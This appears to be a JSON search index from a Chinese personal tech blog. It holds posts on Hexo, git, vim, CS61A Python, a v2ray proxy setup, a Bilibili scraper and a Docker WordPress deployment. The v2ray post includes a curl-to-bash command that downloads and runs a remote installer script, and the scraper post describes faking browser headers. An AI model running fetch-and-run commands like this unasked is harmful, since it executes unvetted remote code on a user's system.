从GitHub上新建一个仓库，仓库名设置为用户名.github.io，然后去setting中去修改page选项，随便选定一个主题\n然后在本地找好一个地方把这个仓库clone下来，然后检查本机上是否已经安装了Node.js和Git，如果没有就补一下\n准备条件完成之后，通过GitBash中的给出的npm工具安装hexo\n$ npm install -g hexo-cli  hexo-cli是hexo + 命令行接口，给出了一些可以从命令行下操作hexo的方法，操作上更加方便，我还没有试一试hexo本身的功能。\n进行初始化\n$ hexo init \u0026lt;folder\u0026gt; $ cd \u0026lt;folder\u0026gt; $ npm install  第一条命令执行完之后可能会出现一些问题，是缺少一些依赖文件，所以通过后两条命令，进入目录然后npm装好相应的文件就可以正常新建了。\n其他在过程中遇到的问题都可以在hexo的文档中找到，中文文档看起来也不是很别扭。\nNexT主题 这个主题的官方文档也有中文的，看起来比较方便。\nNexT官方文档\n遇到的一些问题 修改网页动画速度 修改目录下的 /themes/next/source/js/src/motion.js就可以了\n对其中的duration进行一些改动，自己舒服就好\nHexo NexT主题修改动画效果速度\n博客图片插入 博客图片插入就没有WordPress这么方便了，前几篇博客中用到的图片我是存放到了图床上。\n路过图床\n通过文章中的Markdown语法进行引用\n","id":19,"section":"posts","summary":"\u003cp\u003e记录了从\u003ccode\u003eWordPress\u003c/code\u003e转移到\u003ccode\u003ehexo\u003c/code\u003e过程中遇到的问题以及查阅的资料\u003c/p\u003e","tags":["Blog"],"title":"WordPress转hexo过程","uri":"https://qeryu.github.io/2020/03/wordpress%E8%BD%AChexo%E8%BF%87%E7%A8%8B/","year":"2020"},{"content":"一些git的常用命令，记在这里方便查找（懒得去翻help）\n创建版本库 \u0026amp; 提交上传 # 将一个文件夹初始化成版本库 git init  初始化之后会在目录下新生成一个.git目录，是git用于跟踪管理版本库的，可以通过ls -ah命令查看\n# 添加到暂存区 git add \u0026lt;filename\u0026gt; # 报告当前状况 git status # 提交到版本库并留下本次提交说明 git commit -m \u0026lt;message\u0026gt; # 未add前查看本次修改的内容 git diff \u0026lt;filename\u0026gt; # 查看修改记录（见化输出至一行） git log (--pretty=oneline)  git版本回退 git中版本号是SHA1计算出的一个大数，避免了分布控制时版本号冲突\n# 版本回退 git reset --hard HEAD^  HEAD：表示当前版本，上一个版本就是HEAD^，上上个就是HEAD^^\n回退之后在版本信息中就无法找到在回退之后的内容了，但是可以通过版本号回到指定版本，可以通过只打出前几位，通过缺省进行补全。原因是git的链表式存储方式。\n如果在关闭窗口后还想回到新的版本，可以通过以下找到对应版本号，完成回退\n# 查看执行过的每一个命令 git reflog  工作区 \u0026amp; 暂存区 电脑上的文件夹learngit就是一个工作区，工作区指电脑里能看到的目录。\n而该文件夹下的.git隐藏目录就是git的版本库，其中最重要的是stage(index)暂存区，以及master分支，还有指向master的一个指针HEAD。\ngit add是提交到暂存区，git commit是从暂存区提交到当前分支。\n管理修改 git管理的是修改，不是文件，修改如果不add到暂存区，那么最后commit的时候也不会提交上去\n# 查看工作区和版本库里面最新版本的区别 git diff HEAD -- readme.txt  撤销修改 提交前发现错误 git checkout -- readme.txt # 注意\u0026quot;--\u0026quot;，如果没有的话就是切换到另一个分支了，分支管理中将再次使用。  把readme.txt文件在工作区的修改全部撤销，如果该文件还没有add到暂存区，撤销就是回到版本库中上一个状态；如果是add之后做了修改，撤销就回到暂存区中的状态。总之就是回退到上一次add或者commit的状态。\nadd后发现错误 git reset HEAD \u0026lt;filename\u0026gt;  可以把暂存中的修改撤销掉(unstage)，重新放回工作区，也就是说，git reset既可以回退版本，还可以把暂存区的修改回退到工作区，HEAD的意思是，回退到最新的commit的版本。\n重新放回工作区之后，可以通过上一节的命令来处理工作区的问题。\ncommit之后发现错误  如果git还没有把本地版本推送到远程，那么可以通过版本回退处理 如果已经退送到远程，git分布式就决定了，一旦推送到远程版本库，没救了，这次修改就该不动了\u0026hellip;\u0026hellip;吧？  删除文件 # Linux系统中从工作区删除文件 rm test.txt  当git的版本库和工作区不一样的时候，git status就会返回差异，但是此时版本库中的文件还没有删除，可以通过\ngit rm test.txt git commit -m \u0026quot;remove test.txt\u0026quot;  如果误删除文件，还把这个变动添加到了暂存区，那就需要先进行一步\ngit reset HEAD \u0026lt;filename\u0026gt;  如果只是在工作区里误操作误删除了，可以通过\ngit checkout -- test.txt  把误删除文件返回到最新版本，如果commit之后，还可以通过回退版本号来回退。\n远程仓库 分布式管理，每台机器上的版本库都是一样的，没有主次之分。\ngithub是提供git仓库托管服务的，可以通过注册账号白嫖，本地仓库与github远程仓库是通过SSH加密的，需要一些设置。\n# 创建SSH Key（先看看主目录下有无ssh目录 ssh-keygen -t rsa -C \u0026quot;m15265723639@163.com\u0026quot; # 然后后续设置使用默认值（一路回车 # 登录github，添加上刚才生成的公钥is_rsa.pub，随便起一个title就好了 # 这样就做到了把这台电脑的Key添加到github了  在Github上托管的免费仓库，只有自己能修改，但是所有人都能看到。\n可以通过私有化仓库（付费，或者自己搭一个git服务器来做到\n添加远程库 在Github上获取一个远程库之后，可以通过提示的SSH方式把本地内容推送到远程库\n# 把本地关联到远程库 git remote add origin git@github.com:Uniqsy/learngit.git # 把本地库所有内容推送到远程库 git push -u origin master  本质上是把本地的master分支推送到远程\n-u：Git不但会把本地的master分支内容推送到远程master分支，还会把本地master分支和远程master分支关联起来，这样可以简化以后的推送，后续推送就只需\ngit push origin master  第一次使用Git的clone或者push命令时，会有警告去确认是否连接到了正确的Github服务器，可以通过检查网站上给出的信息来进行比对确认，以后的push或者clone里就不会有了。\n从远程库克隆 git clone git@github.com:Uniqsy/gitskills.git  Git支持多种协议，包括https但是通过ssh支持的原生git协议速度最快。\n分支管理 Git中的分支管理都是基于类似于链表的东西，所以切换分支以及合并分支都十分迅速。\n# 查看分支 git branch # 创建分支 git branch \u0026lt;branchname\u0026gt; # 切换分支 git checkout \u0026lt;branchname\u0026gt; # 创建切换分支 git checkout -b \u0026lt;branchname\u0026gt; 合并某分支到当前分支 git merge \u0026lt;branchname\u0026gt; 删除分支 git branch -d \u0026lt;branchname\u0026gt;  解决冲突（两条分支都存在修改 两条分支上对于同一个文件进行了修改，产生文件上的冲突还得手动解决\n合并产生冲突后手动修改文件使之一样酒醒，可以通过\ngit log --graph --pretty=oneline --abbrev-commit  查看像是个图的合并结果\n分支管理策略 git merge --no-ff -m \u0026quot;merge with no-ff\u0026quot; dev # 在合并分支时添加参数，禁用fast forward可以创建一个commit然后以后查看本次合并的信息，否则看不出分支曾经合并过  一般来说，在dev分支上开发，然后等需要的时候再合并回master分支\nbug分支_切换分支需要保存现场 # 保存当前工作进度 git stash #查看保存的工作进度 git stash list # 恢复 git stash apply # 删除 git stash drop # 一步完成 git stash pop  假设当前在master上发现了bug并通过分支fix_bug进行了修改，但是目前的dev也存在bug所以需要将master上进行的修改复制到dev上进行再进行修改\n在dev分支下，可以将操作复制执行一遍，也可以从dev修改，然后在master进行cherry-pick\ngit cherry-pick \u0026lt;版本号\u0026gt;  Feature分支 开发一个新feature，最好新建一个分支\ngit branch -D \u0026lt;name\u0026gt; # 强行删除没有合并过的分支  多人协作 # 查看远程库信息，显示可以抓取和推送的origin的地址 git remote -v # 推送一个分支到远程库对应的远程分支 git push origin \u0026lt;分支名\u0026gt;  不是所有的分支都一定需要推送到远程\n master分支是主分支，此要时刻与远程同步； dev分支是开发分支，团队所有成员都需要在上面工作，所以也需要与远程同步； bug分支只用于在本地修复bug，就没必要推到远程了，除非老板要看看你每周到底修复了几个bug； feature分支是否推到远程，取决于你是否和你的小伙伴合作在上面开发。  多人协作模式：\n 首先，可以试图用git push origin 推送自己的修改； 如果推送失败，则因为远程分支比你的本地更新，需要先用git pull试图合并； 如果合并有冲突，则解决冲突，并在本地提交； 没有冲突或者解决掉冲突后，再用git push origin 推送就能成功！  如果git pull提示no tracking information，则说明本地分支和远程分支的链接关系没有创建，用命令\ngit branch --set-upstream-to \u0026lt;branch-name\u0026gt; origin/\u0026lt;branch-name\u0026gt;  ","id":20,"section":"posts","summary":"\u003cp\u003e一些git的常用命令，记在这里方便查找（懒得去翻help）\u003c/p\u003e","tags":["git"],"title":"git使用笔记","uri":"https://qeryu.github.io/2020/01/git%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/","year":"2020"},{"content":"从昨天晚上顺利完成从虚拟机用户到双系统用户的转型之后，现在似乎再次进入到了ubuntu的探索阶段，\n之前有学过一段时间vim怎么用，但是因为太久远了，也没写博客，就这么忘掉了。\n基础操作（打开文件，写入，保存） 打开文件 vim \u0026lt;filename\u0026gt;  这个命令在文件存在的时候是打开文件，在文件不存在的时候是新建文件，还可以通过文件前的路径名来打开不同位置的文件。\n写入 \u0026amp; 保存 命令模式下  i 切换到编辑模式 x 删除当前光标处的字符 : 切换到底线命令模式  移动光标    操作 作用     h 或 (←) 光标向左移动一个字符   j 或 (↓) 光标向下移动一个字符   k 或 (↑) 光标向上移动一个字符   l 或 (→) 光标向右移动一个字符   多次移动 \u0026lt;移动次数\u0026gt;\u0026lt;指令\u0026gt;，例如“30j”       Ctrl + F 屏幕『向下』移动一页，相当于 [Page Down]按键 (常用)   Ctrl + B 屏幕『向上』移动一页，相当于 [Page Up] 按键 (常用)   Ctrl + D 屏幕『向下』移动半页   Ctrl + U 屏幕『向上』移动半页       + 光标移动到非空格符的下一行   - 光标移动到非空格符的上一行       H 光标移动到这个屏幕的最上方那一行的第一个字符   M 光标移动到这个屏幕的中央那一行的第一个字符   L 光标移动到这个屏幕的最下方那一行的第一个字符       G 移动到这个档案的最后一行   nG n 为数字。移动到这个档案的第 n 行。例如 20G 则会移动到这个档案的第 20 行(可配合 :set nu)   gg 移动到这个文件的第一行   n n 为数字。光标向下移动 n 行    搜索替换  /word: 从光标向下寻找word ?word: 从光标向上寻找word n: 正向寻找下一个word N: 反向寻找下一个word  此处的正向反向取决于上一条命令，如果上一条命令是向下查找，那么正向便是向下，反向便是向上；反之亦然。\n删除 \u0026amp; 复制 \u0026amp; 粘贴  x: 向后删除一个字符 dd: 删除当前行  该两项均可配合前缀n使用，即向下删除n个字符或者n行\n   d1G 删除光标所在到第一行的所有数据     dG 删除光标所在到最后一行的所有数据   d$ 删除游标所在处，到该行的最后一个字符   d0 那个是数字的 0 ，删除游标所在处，到该行的最前面一个字符    yy为复制指令，其使用方式与dd相同，也是有n, 1G, G, $, 0等东西可以进行修饰。\n  p: 粘贴到所在行的下方（小写）\n  P: 粘贴到所在行的上方（大写）\n  u: 复原上一条指令，(Ctrl+z)\n  .: 重复上一条指令\n  底线命令模式下  w 保存文件 q 退出程序(vi/vim)  以上两条指令，均可在其后面加上!进行修饰，表示强制进行。\n   命令格式 功能     :w  另存为   :r  将另一个文件粘贴到光标下方   :n1,n2 w 将n1行到n2行保存为一个文件    代码高亮与自动缩进 更改配置文件达到目的效果\n设置文件在/etc/vim/vimrc\nvim ~/.vimrc set smartindent #自动缩进 set shiftwidth=4 #设定tab宽 set expandtab #将tab转成space #如果要将已有的tab转换成space的话，可以在expandtab之后输入，:retab! set tabstop=4 #读到文档中\\t时，要解释为4个空白 set sotftabstop=4 #在编辑模式下，按下tab会展开成为4个space syntax enable #开启语法高亮 set nu #显示行数  其他基本配置 set nocompatible #不与vi兼容，采用vim自己的操作命令 set mouse=a #支持使用鼠标 set encoding=utf-8 #使用utf-8编码 set t-Co=256 #启用256色 filetype indent on #开启文件类型检查，并且载入与该类型对应的缩进规则。比如，如果编辑的是.py文件，Vim 就是会找 Python 的缩进规则~/.vim/indent/python.vim。 set cursorline #光标所在的当前行高亮  学习连接 有些是自己探索的，但是大部分还是抄的dalao博客\nhttp://www.ruanyifeng.com/blog/2018/09/vimrc.html\n","id":21,"section":"posts","summary":"\u003cp\u003e从昨天晚上顺利完成从虚拟机用户到双系统用户的转型之后，现在似乎再次进入到了\u003ccode\u003eubuntu\u003c/code\u003e的探索阶段，\u003c/p\u003e\n\u003cp\u003e之前有学过一段时间vim怎么用，但是因为太久远了，也没写博客，就这么忘掉了。\u003c/p\u003e","tags":["vim"],"title":"vim使用笔记","uri":"https://qeryu.github.io/2020/01/vim%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/","year":"2020"},{"content":"CS61A课程2019年秋季学年网课学习笔记\nEnvironment \u0026amp; Frame 通过这两个概念去理解函数的执行过程，以及name与函数或者是数值之间的关系。\nPython 命令行参数 -m doctest \u0026lt;python_source_file\u0026gt; 结合下文docstring以及doctest内容，当以文件形式编辑Python的时候，可以通过该命令进行执行测试，达到使用run_docstring_examples函数的效果\n如果想在此时看到具体的docstring以及调试内容，可以在doctest后加参数-v\n-i \u0026lt;python_source_file\u0026gt; 以交互模式打开文件，执行完后进入到\u0026quot;\u0026raquo;\u0026gt;\u0026ldquo;状态\n出现的词汇  boolean context intrinsic name scope：范围广度 interchangeability ：互换性 exemplify： 是…的典型(或典范、榜样); 举例说明; 例证; 例示 suppress： 镇压; (武力) 平定; 压制; 禁止(发表); 查禁; 封锁; 抑制; 控制; 忍住; dicard： 丢弃; 抛弃; 垫(牌); 打出(无用的牌); recursive：递归的，循环的 iteration：迭代 enumerate：枚举 halt：中止 arduous：艰巨的 refinement：细化  代码规范——Python https://www.python.org/dev/peps/pep-0008/\n 函数名使用小写字母，单词与单词中间用\u0026rsquo;_\u0026lsquo;分割，最好使用一些解释说明。 函数名最好与函数中进行的运算或者是函数的结果有关。 参数名使用小写字母， 单词与单词中间用\u0026rsquo;_\u0026lsquo;分割 。最好使用仅使用一个单词的参数名。 参数名应当与函数中该参数的作用有关，而不是仅仅i, j, k 在变量作用很显然的时候，可以使用单个字幕表示，但是尽量少取使用l, O, I这三个，避免其他看上去和数字混淆。  函数抽象概念 \u0026amp; 黑盒 将函数执行的过程忽略，只考虑函数的输入、输出以及输入输出之间的关系，其他的内容不去深究。如此去使用Python Library提供的大量函数，将这些黑盒进行不断地组合，然后拼接成为整体。\n函数设计  一个函数对应一个功能，如果需要连续进行多个功能，就拆分成多个函数 DRY原则，不要在代码中多次重复相同的内容。将那些相同的内容写成一个个函数 将相似的东西抽象出共性然后写成函数。  docstring \u0026amp; doctests docstring内容 code is written only once, but often read many times.\n描述函数的输入输出以及作用，并给出一段例子\n以课本上给出的为例\ndef pressure(v, t, n): \u0026quot;\u0026quot;\u0026quot;Compute the pressure in pascals of an ideal gas. Applies the ideal gas law: http://en.wikipedia.org/wiki/Ideal_gas_law v -- volume of gas, in cubic meters t -- absolute temperature in degrees kelvin n -- particles of gas \u0026quot;\u0026quot;\u0026quot; k = 1.38e-23 # Boltzmann's constant return n * k * t / v  doctest模块 run_docstring_examples def sum_naturals(n): \u0026quot;\u0026quot;\u0026quot;Return the sum of the first n natural numbers. \u0026gt;\u0026gt;\u0026gt; sum_naturals(10) 55 \u0026gt;\u0026gt;\u0026gt; sum_naturals(100) 5050 \u0026quot;\u0026quot;\u0026quot; total, k = 0, 1 while k \u0026lt;= n: total, k = total + k, k + 1 return total  testmod() 结合函数给出的docstring的内容测试函数\n\u0026gt;\u0026gt;\u0026gt; from doctest import testmod \u0026gt;\u0026gt;\u0026gt; testmod() TestResults(failed=0, attempted=2)  run_docstring_examples(fuction_name, globals(), True) 一处一处执行函数中docstring部分给出的测试数据，如果正确，就给出ok的返回\n\u0026gt;\u0026gt;\u0026gt; from doctest import run_docstring_examples \u0026gt;\u0026gt;\u0026gt; run_docstring_examples(sum_naturals, globals(), True) Finding tests in NoName Trying: sum_naturals(10) Expecting: 55 ok Trying: sum_naturals(100) Expecting: 5050 ok  assert assert 一段表达式, \u0026quot;该表达式不成立时的返回值\u0026quot;  通过assert进行非法输入的检测，也是在验证函数的行为符合预期，避免非法输入导致程序崩溃。\n同时，assert也可以作为函数调用的例子，展示函数调用的期望方式与期望结果。\n一般在编写Python程序的时候将这些测试用内容单独写一个文件\u0026rdquo;*_test.py\u0026quot;，方便修改与删除。\n感觉和try\u0026hellip;expectation蛮相似的，后面应该会讲吧\nhigher-order function（貌似就是函数套函数） 数学例子黄金分割计算 可以通过将一个正数x重复以下步骤得到黄金分割比例：\nx += 1 x = 1 / x  贼神奇，不过到底是为什么，网上给出的解释也不清楚。\nCurrying（咖喱？）（柯里） 有两段代码是之前没怎么见过的，留存一下，内容很简单，就是把单一参数与多参数的函数相互转换。\n\u0026gt;\u0026gt;\u0026gt; def curry2(f): \u0026quot;\u0026quot;\u0026quot;Return a curried version of the given two-argument function.\u0026quot;\u0026quot;\u0026quot; def g(x): def h(y): return f(x, y) return h return g \u0026gt;\u0026gt;\u0026gt; def uncurry2(g): \u0026quot;\u0026quot;\u0026quot;Return a two-argument version of the given curried function.\u0026quot;\u0026quot;\u0026quot; def f(x, y): return g(x)(y) return f \u0026gt;\u0026gt;\u0026gt; pow_curried = curry2(pow) \u0026gt;\u0026gt;\u0026gt; pow_curried(2)(5) 32 \u0026gt;\u0026gt;\u0026gt; map_to_range(0, 10, pow_curried(2)) 1 2 4 8 16 32 64 128 256 512  Lambda Expressions lambda \u0026lt;parameters\u0026gt;: \u0026lt;return expression\u0026gt;  相当于一个简单的定义函数的方式，但是lambda表达式只能有一个返回值，没啥\n尽管lambda方式更加简洁，而且使用它可以让程序看起来短一些，但是它比较影响可读性。尽管Python中有这个方式，还是尽量用def吧，看起来简单明了。\nDecorator 从网络上学习的，感觉已经有人写的很清楚了，我就不重复造轮子了。\nhttps://www.cnblogs.com/zh605929205/p/7704902.html\n简单说，就是将函数名所连接的对象变成了函数作为参数进入@的结果。\n\u0026gt;\u0026gt;\u0026gt; def trace(fn): def wrapped(x): print('-\u0026gt; ', fn, '(', x, ')') return fn(x) return wrapped \u0026gt;\u0026gt;\u0026gt; @trace def triple(x): return 3 * x \u0026gt;\u0026gt;\u0026gt; triple(12) -\u0026gt; \u0026lt;function triple at 0x102a39848\u0026gt; ( 12 ) 36 \u0026gt;\u0026gt;\u0026gt; def triple(x): return 3 * x \u0026gt;\u0026gt;\u0026gt; triple = trace(triple)  我遇到的问题 在通过ok进行练习或者测试的过程中，发现没有bcourse的邮箱，上网发现似乎是要邀请或者是伯克利本校的学生才能弄到，于是就自high地做做题吧，不提交了，等明年新一轮cs61a开课再补上作业，这样也有机会复习一遍。\n听歌的时候偶尔听到一首歌很喜欢，评论区捞到是《四月物语》的插曲，码住码住，以后补上，以后一定看，一定看，咕咕咕。\n","id":22,"section":"posts","summary":"\u003cp\u003eCS61A课程2019年秋季学年网课学习笔记\u003c/p\u003e","tags":["Python","学习笔记"],"title":"CS61A_FA2019_week2\u00263","uri":"https://qeryu.github.io/2020/01/cs61a_fa2019_week23/","year":"2020"},{"content":"大部分是用的别人写好的脚本\n0 配置  vultr服务器：主机位置在新加坡，系统为CentOS 7  1 方法 2020年最新v2ray搭建详细图文教程\n具体操作流程依旧是为了不重复造轮子而直接给出链接\n我在初次搭建的时候，犯了一个蠢到爆的错误，我在服务器上开的防火墙端口和我要用的差了一位数，当时出现了问题，死活查不出来，现在觉得当时就是个憨憨\n在这个过程中使用到的远程连接以及ftp工具，我用的是Xshell与Xftp，这两个对于个人用户是免费的，虽然有些些限制，但是无伤大雅。\n家庭/学校免费\n2 使用 Windows 直接将配置好的包包打包传送，在需要使用的电脑上打开，运行就好\n包包的名字应该是V2rayN\n进入到v2ray-windows-64，双击打开v2ray.exe就行了，这时候任务栏应该会出现一个紫色的小圈圈\n然后打开浏览器试一下能否正常访问 www.google.com\nUbuntu 18.04 # 安装curl工具 sudo apt install curl # 执行v2ray官方脚本 bash \u0026lt;(curl -L -s https://install.direct/go.sh)  安装完成后，不会像win下这么方便，需要手动修改config.json配置文件，但是这个配置文件在win下是有的，如果已经在win下安装过，可以将文件夹下的该配置文件直接复制粘贴到/etc/v2ray/\n然后通过systemctl命令启动并检查状态\n","id":23,"section":"posts","summary":"\u003cp\u003e大部分是用的别人写好的脚本\u003c/p\u003e","tags":["v2ray","科学上网"],"title":"v2ray配合下的科学上网","uri":"https://qeryu.github.io/2019/12/%E5%9F%BA%E4%BA%8Ev2rayn%E7%9A%84%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E6%96%B9%E6%B3%95/","year":"2019"},{"content":"用python语言写的简单的B站爬虫\n网络爬虫基本工作流程  获取初始的URL，该URL是你指定的，想爬取的网页 爬取对应URL地址的网页的时候，获取新的URL地址 将新的URL地址放入URL队列中 从URL队列中读取新的URL，重复 停止条件设置，或者，直至无法获取新的URL  headers设置 原因 有些网站会禁止爬虫访问（比如*乎），加上headers信息可以将访问伪装成浏览器，这样就可以继续访问了。\n实现 在Firefox中打开要爬取的页面，按F12查看网络，刷新界面，找到要一组请求头，全部复制，做成headers字典，并在requests.get时使用headers=headers\nB站信息存储位置 由于B站对爬虫十分友好，经查阅网上资料（见后面链接），可以找到每种类型对应的api位置。\n通过爬取获得json文件，然后通过进行json文件的字典提取，得到每一个标签对应的数据，比如标题title，弹幕数danmaku。\n最后将获取到的字典comic_list写入到csv文件中\n对比之前写的代码检查文件，这次试用csv文件进行写真是太方便了\n遇到的问题 想同时获取硬币、评分、收藏，但是很麻烦的是，评分与我已经找的东西不在同一个json文件中，也没有找到合适跳转方式，只能作罢了，留下一个想法，也许可以通过对加载完的网页进行一些正则匹配获得结果\ncode import requests import json import csv import time from multiprocessing.dummy import Pool as ThreadPool headers = {...} comic_list = [] urls = [] def get_url(x): url = 'http://api.bilibili.com/x/web-interface/newlist?rid='+str(x)+'\u0026amp;pn=' for i in range(1, 513): urls.append(url + str(i) + '\u0026amp;ps=50') def get_message(url): print(url) time.sleep(0.5) try: r = requests.get(url, timeout=5) data = json.loads(r.text)['data']['archives'] for j in range(len(data)): content = {} content['aid'] = data[j]['aid'] content['title'] = data[j]['title'] content['coin'] = data[j]['stat']['coin'] content['danmaku'] = data[j]['stat']['danmaku'] content['reply'] = data[j]['stat']['reply'] comic_list.append(content) except Exception as e: print(e) def write_to_file(comic_list): with open(addr, 'w', newline='', encoding='utf-8') as f: fieldnames = ['aid', 'title', 'coin', 'danmaku', 'reply'] writer = csv.DictWriter(f, fieldnames = fieldnames) writer.writeheader() try: writer.writerows(comic_list) except Exception as e: print(e) if __name__ == '__main__': addr = input(\u0026quot;信息(*.csv)保存位置：\u0026quot;) x = input(\u0026quot;获取类型：完结番剧 32；连载番剧 33: \u0026quot;) get_url(x) pool = ThreadPool(4) pool.map(get_message, urls) pool.close() write_to_file(comic_list)  链接 52pojie-Python利用B站API获取视频信息\n简书-\u0026lt;python3爬虫\u0026gt;bilibili完结番剧分区数据抓取\nGitHub-BilibiliSpider\n学到的 主要还是熟悉了各种模块的使用\n json模块 ThreadPool模块 time模块 requests模块 csv模块 Python的字典与列表类型 ","id":24,"section":"posts","summary":"\u003cp\u003e用python语言写的简单的B站爬虫\u003c/p\u003e","tags":["Python","爬虫"],"title":"Python语言B站爬虫","uri":"https://qeryu.github.io/2019/12/python%E7%88%AC%E5%8F%96b%E7%AB%99%E7%95%AA%E5%89%A7%E4%BF%A1%E6%81%AF/","year":"2019"},{"content":"用docker搭建一个WordPress试试吧，有个博客来记录一下总是好的。\n从今天开始换成Hexo了，又换成了Hugo\n基础配置 服务器：阿里云学生特惠轻量应用服务器\n系统：CentOS 7.3\ndocker安装 安装目的 如果直接在服务器上布置，为了运行WordPress，首先需要安装MySQL，Apache2（即httpd）（或者是nginx）、PHP以及最新版本的WordPress，来组成常用的LAMP（Linux+Apache+MySQL+PHP）框架或者是LNMP（Linux+nginx+MySQL+PHP）框架。\n这个过程一般来说是麻烦且难以移植的\n但是如果通过docker的话，环境配置部分就得到了简化，并且不用担心在准备环境的时候，要去调整原来的PHP版本，去修改MySQL的版本，还要专门折腾Apache或者NGINX。\n安装步骤 切换到root用户，通过yum命令来安装docker，在这之前先升级所有包同时也升级软件和系统内核\nsudo su root yum update -y yum install docker -y  后续的步骤都要求你对服务器有绝对的控制权，也就是说后续没有特别说明，我们都是以root用户运行命令\n默认情况下，只有root用户和docker组的用户才能访问Docker引擎的Unix socket。当然直接用root权限使用docker太过危险（删库跑路），建议新建一个docker用户，然后加入docker用户组\ngroupadd docker useradd -g docker docker  通过阿里云的容器镜像服务的镜像加速器可以加快一些些docker从仓库中下载镜像的速度\nsudo mkdir -p /etc/docker sudo tee /etc/docker/daemon.json \u0026lt;\u0026lt;-'EOF' { \u0026quot;registry-mirrors\u0026quot;: [\u0026quot;https://x2sqfp3l.mirror.aliyuncs.com\u0026quot;] } EOF sudo systemctl daemon-reload sudo systemctl restart docker  MySQL安装 安装目的 由于WordPress需要MySQL来处理数据，所以需要提前安装好MySQL然后将后续安装的WordPress连接到MySQL上\n安装步骤 从docker镜像仓库中获取MySQL的最新版本的镜像\ndocker pull mysql  通过docker的run指令启动一个MySQL容器\ndocker run --name \u0026lt;ContainerName\u0026gt; -e MYSQL_ROOT_PASSWORD=\u0026lt;Password\u0026gt; -d mysql  此处以及下处的各种参数的意义参见 https://www.jianshu.com/p/2faca4e1f6fb\n安装完成后，进入MySQL，新建数据库wordpress，查看是否创建成功\ndocker exec -it mysqlname bash # 进入mysql的容器 mysql -uroot -p # 此处输入密码 CREATE DATABASE wordpress; SHOW DATABASES;  WordPress安装 同上\ndocker pull wordpress docker run --name yourcontainername -e WORDPRESS_DB_HOST=mysql -e WORDPRESS_DB_PASSWORD=yourpassword --link mysqlname:mysql -p 80:80 -d wordpress  遇到问题及解决办法 遇到问题 一切按照网上的安排后打开host-ip却发现\nError establishing a database connection  解决办法 通过以下语句进入到容器内部，查看wp-config.php文件是否正确\ndocker exec -it \u0026lt;WordPressName\u0026gt; bash cat wp-config.php  进入后发现各种参数都是对的上的，比如DB_NAME之类的，都是正确的\n后修改wp-config.php中的DEBUG参数，使之显示报错提示，通过报错提示\nThe server requested authentication method unknown to the client  搜索得到结果，原因是新版本的MySQL账号密码解锁机制不一致导致的问题\n在MySQL中通过alter user命令修改解锁机制就行\nuse mysql; ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '你的密码';  参考资料 docker.hub关于WordPress以及MySQL的安装\nhttps://hub.docker.com/_/wordpress/\nhttps://hub.docker.com/_/mysql/\nhttps://www.jianshu.com/p/2faca4e1f6fb\nhttps://blog.csdn.net/guoguicheng1314/article/details/80526111\n","id":25,"section":"posts","summary":"\u003cp\u003e用docker搭建一个WordPress试试吧，有个博客来记录一下总是好的。\u003c/p\u003e\n\u003cp\u003e从今天开始换成Hexo了，又换成了Hugo\u003c/p\u003e","tags":["docker","WordPress"],"title":"通过docker搭建WordPress体会","uri":"https://qeryu.github.io/2019/12/%E9%80%9A%E8%BF%87docker%E6%90%AD%E5%BB%BAwordpress%E4%BD%93%E4%BC%9A/","year":"2019"}],"tags":[{"title":"arp-spoofing","uri":"https://qeryu.github.io/tags/arp-spoofing/"},{"title":"Beego","uri":"https://qeryu.github.io/tags/beego/"},{"title":"Blog","uri":"https://qeryu.github.io/tags/blog/"},{"title":"C++","uri":"https://qeryu.github.io/tags/c++/"},{"title":"Coolq","uri":"https://qeryu.github.io/tags/coolq/"},{"title":"docker","uri":"https://qeryu.github.io/tags/docker/"},{"title":"ESlint","uri":"https://qeryu.github.io/tags/eslint/"},{"title":"Fuzzing","uri":"https://qeryu.github.io/tags/fuzzing/"},{"title":"git","uri":"https://qeryu.github.io/tags/git/"},{"title":"Golang","uri":"https://qeryu.github.io/tags/golang/"},{"title":"Java","uri":"https://qeryu.github.io/tags/java/"},{"title":"JavaScript","uri":"https://qeryu.github.io/tags/javascript/"},{"title":"Linux","uri":"https://qeryu.github.io/tags/linux/"},{"title":"LSTM","uri":"https://qeryu.github.io/tags/lstm/"},{"title":"Maven","uri":"https://qeryu.github.io/tags/maven/"},{"title":"Metasploit3","uri":"https://qeryu.github.io/tags/metasploit3/"},{"title":"Montage","uri":"https://qeryu.github.io/tags/montage/"},{"title":"pwn","uri":"https://qeryu.github.io/tags/pwn/"},{"title":"Python","uri":"https://qeryu.github.io/tags/python/"},{"title":"ret2libc","uri":"https://qeryu.github.io/tags/ret2libc/"},{"title":"RNN","uri":"https://qeryu.github.io/tags/rnn/"},{"title":"scapy","uri":"https://qeryu.github.io/tags/scapy/"},{"title":"seed","uri":"https://qeryu.github.io/tags/seed/"},{"title":"SemanticFuzzing","uri":"https://qeryu.github.io/tags/semanticfuzzing/"},{"title":"syn-flooding","uri":"https://qeryu.github.io/tags/syn-flooding/"},{"title":"v2ray","uri":"https://qeryu.github.io/tags/v2ray/"},{"title":"vim","uri":"https://qeryu.github.io/tags/vim/"},{"title":"WordPress","uri":"https://qeryu.github.io/tags/wordpress/"},{"title":"XML","uri":"https://qeryu.github.io/tags/xml/"},{"title":"Zest","uri":"https://qeryu.github.io/tags/zest/"},{"title":"学习笔记","uri":"https://qeryu.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"title":"渗透测试","uri":"https://qeryu.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"title":"爬虫","uri":"https://qeryu.github.io/tags/%E7%88%AC%E8%99%AB/"},{"title":"科学上网","uri":"https://qeryu.github.io/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"},{"title":"论文阅读","uri":"https://qeryu.github.io/tags/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"}]}